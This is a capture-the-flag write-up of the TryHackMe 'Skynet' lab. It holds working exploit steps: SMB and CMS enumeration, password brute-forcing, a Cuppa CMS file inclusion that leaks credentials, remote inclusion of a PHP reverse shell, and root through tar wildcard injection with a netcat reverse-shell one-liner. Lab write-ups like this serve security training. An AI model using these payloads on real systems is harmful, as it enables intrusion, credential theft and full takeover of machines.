# Skynet writeup
#pentest/tryhackme

## Less sloppy writeups:
* [Writeups/Skynet.md at master · Kahvi-0/Writeups · GitHub](https://github.com/Kahvi-0/Writeups/blob/master/TryHackMe/Skynet.md)
	* Using metasploit and linpeas for privilege escalation
* [Skynet Writeup](https://blog.tryhackme.com/skynet-writeup/)
	* Using a `tar` trick for privilege escalation

Navigating to the main page I couldn’t find anything interesting. The source code was pretty empty, also no access to common pages like admin or robots.txt.

We have to do some more recon:
1. Fire `dirsearch` to try to find more endpoints
2. Fire `nmap` to enumerate services

Both of them were productive, let’s start with `dirsearch`

```shell
$ python3 dirsearch.py -u 10.10.186.62 --extensions-list
[19:23:17] Starting: 
[19:23:20] 301 -  309B  - /js  ->  http://10.10.186.62/js/
...
[19:23:47] 301 -  312B  - /admin  ->  http://10.10.186.62/admin/                 
[19:23:51] 403 -  277B  - /admin/?/login
[19:24:59] 301 -  313B  - /config  ->  http://10.10.186.62/config/                                                
[19:25:00] 403 -  277B  - /config/           
[19:25:04] 301 -  310B  - /css  ->  http://10.10.186.62/css/
[19:25:32] 200 -  523B  - /index.html                                                                                                                                     
[19:26:20] 403 -  277B  - /server-status/
[19:26:30] 301 -  319B  - /squirrelmail  ->  http://10.10.186.62/squirrelmail/                                    
                                                                                        
Task Completed  
```

Nothing super interesting after visiting these pages besides this **squirrelmail**, version **1.4.23**

Now to `nmap`

```shell
$ nmap -sV 10.10.186.62
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Lot’s of things to dig into like Apache, Samba, imap and  pop3. 

```
IMAP and POP3 are the two most commonly used Internet mail protocols for retrieving emails. Both protocols are supported by all modern email clients and web servers.
```

Let’s start with **squirrelmail**, any vulnerabilities?

```shell
$ searchsploit squirrelmail -w 

-----------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                      |  URL
-----------------------------------------------------------------------------------------------------------------------------------
...
Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                            | https://www.exploit-db.com/exploits/27948
SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                               | https://www.exploit-db.com/exploits/24068
...
-----------------------------------------------------------------------------------------------------------------------------------
```

Sweet, let’s investigate https://www.exploit-db.com/exploits/27948 first. We learn that this version is vulnerable to LFI and the way to exploit it is by doing something like: `http://www.example.com/[squirrelmail dir]/src/redirect.php?plugins[]=../../../../etc/passwd%00`

Let’s try: `http://10.10.186.62/squirrelmail/src/redirect.php?plugins[]=../../../../etc/passwd%00`
Seems like I have to be logged in to view the page, that’s a bummer. Let’s keep this in mind though.

The second vulnerability explains that we can do things like:
`http://www.example.com/mail/src/compose.php?mailbox=">&lt;script&gt;window.alert(document.cookie)&lt;/script&gt;`
Which won’t help us here since we don’t have anyone to send our well crafted payload.

Back to **nmap**, let’s start enumerating our shares in **samba**.

```shell
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.186.62

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.186.62\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.186.62\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.186.62\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   ...
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```

We might have found a user called **milesdyson**, we also found two shares that can be accesses anonymously called **IPC$** and **anonymous**.
Let’s connect using **smbclient**:

```shell
$ smbclient //10.10.186.62/anonymous --no-pass
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019
```

On another tab:

```shell
$ smbget -R smb://10.10.186.62/anonymous/attention.txt
Password for [kali] connecting to //anonymous/10.10.186.62: 
Using workgroup WORKGROUP, user kali
smb://10.10.186.62/anonymous/attention.txt 
$ cat attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Interesting, seems like Miles Dyson is an administrator. Lets keep digging.

```shell
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Wed Sep 18 00:41:20 2019
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

# In another tab
$ smbget -R smb://10.10.186.62/anonymous/logs/log1.txt
...
$ smbget -R smb://10.10.186.62/anonymous/logs/log2.txt
...
$ smbget -R smb://10.10.186.62/anonymous/logs/log3.txt
...

$ cat log1.txt
# A list of LOGINS OR PASSWORDS ?!!
$ cat log2.txt
# empty
$ cat log3.txt
# empty
```

What about the share **IPC$**?

```shell
$ smbclient //10.10.186.62/IPC$
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```

So our **log1.txt** gave us what could be logins or passwords and we know we have a **milesdyson** as an administrator.
Our plan of attack will be to use **Burp Intruder** with this list as passwords and attempt to login with one of the following usernames:

* milesdyson
* miles
* dyson

And look of that, `milesdyson/cyborg007haloterminator` as login/pass gives us a nice response! We can now login on **squirrelmail**!
The first email is super interesting as it indicates that we might have access to a new Samba share with milesdyson login.

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

The second email is a message on binary and after being converter through [Binary to Text Converter | Binary Translator](https://www.rapidtables.com/convert/number/binary-to-ascii.html) we get:

```
balls have zero to me to me to me to me to me to me to me to me to
```

This is similar to the third email. Is this a riddle? I don’t know, but let’s investigate that samba share! Remember we found `//10.10.186.62/milesdyson` 
earlier? That’s the one we will try to connect to.

```shell
$ smbclient -U milesdyson //10.10.186.62/milesdyson
$ ls
notes
...
$ cd notes
$ ls
important.txt
...
$ exit
$ smbget -U milesdyson -R smb://10.10.157.89/milesdyson/notes/important.txt
Password for [milesdyson] connecting to //milesdyson/10.10.157.89: 
Using workgroup WORKGROUP, user milesdyson
smb://10.10.157.89/milesdyson/notes/important.txt                                                                                               
Downloaded 117b in 14 seconds

$ cat important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

Sweet! a hidden page at **/45kra24zxs28v3yd**!

Time to run a `dirsearch` on it! 

```shell
$ python3 dirsearch.py -u 10.10.186.62/45kra24zxs28v3yd --extensions-list
...
[15:28:25] 301 -  337B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.195.21/45kra24zxs28v3yd/administrator/
[15:28:26] 403 -  277B  - /45kra24zxs28v3yd/administrator/.htaccess
[15:28:26] 200 -    5KB - /45kra24zxs28v3yd/administrator/
[15:28:26] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php
[15:29:27] 200 -  418B  - /45kra24zxs28v3yd/index.html  
```

Sweet, an administrator page! Seems like we are running Cuppa CMS.

```shell
searchsploit cuppa -w
------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                        |  URL
------------------------------------------------------------------------------------------------------------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                       | https://www.exploit-db.com/exploits/25971
------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
``` 

Even unauthenticated we can read files from the filesystem and even download files? What else do we need, really?
Let’s first get the configuration file.

```
# Request
http://10.10.195.21/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

# Response
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo

# After a Base64 decode
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
	...
	} 

```

`media/uploadFiles`, eh? We can use the same vulnerability for the system do download our reverse shell and spawn a `netcat listener` on our side.

```shell
$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php

# Change it to include our IP and netcat port
# vim shell.php

# Host our php shell
$ python3 -m http.server

# On another tab
$ nc -nlvp 1234

# Hit the url with out server
http://10.10.195.21/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<our-ip>:<our-port>/shell.php
```

And we have managed to execute a command on the remote machine!

```shell
connect to [10.2.13.100] from (UNKNOWN) [10.10.195.21] 56246
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 14:58:20 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned of
$ cat /home/milesdyson/user.txt
7ce5c2109a40f958099283600a9ae807
```

And our user flag is here. :) Can we elevate our privileges?
Upon inspection we can see that we have some interesting cronjobs running.

```shell
$ cat /etc/crontab
...
# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

` /home/milesdyson/backups/backup.sh` is running as `sudo`, but we have access to the file. Sweet!

```shell
$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

And look at that, a bash exactly as we need. Now all we need to do is to exploit `tar` since it’s using a wildcard (*) to create a checkpoint between the extraction steps to call our netcat listener as `root` !  Check a better explanation here [Exploiting wildcards on Linux - Help Net Security](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/) and https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

So we need to change our script with something like:

```shell
$ cd /var/www/html
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <our-ip> <our-port> > /tmp/f" > shell.sh
$ chmod 777 shell.sh
$ echo "/var/www/html"  > "--checkpoint-action=exec=sh shell.sh"
$ echo "/var/www/html"  > --checkpoint=1
```

Now we create yet another netcat listener on our new port.

```shell
$ nc -nlvp 4444
...
$ whoami
root
$ cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```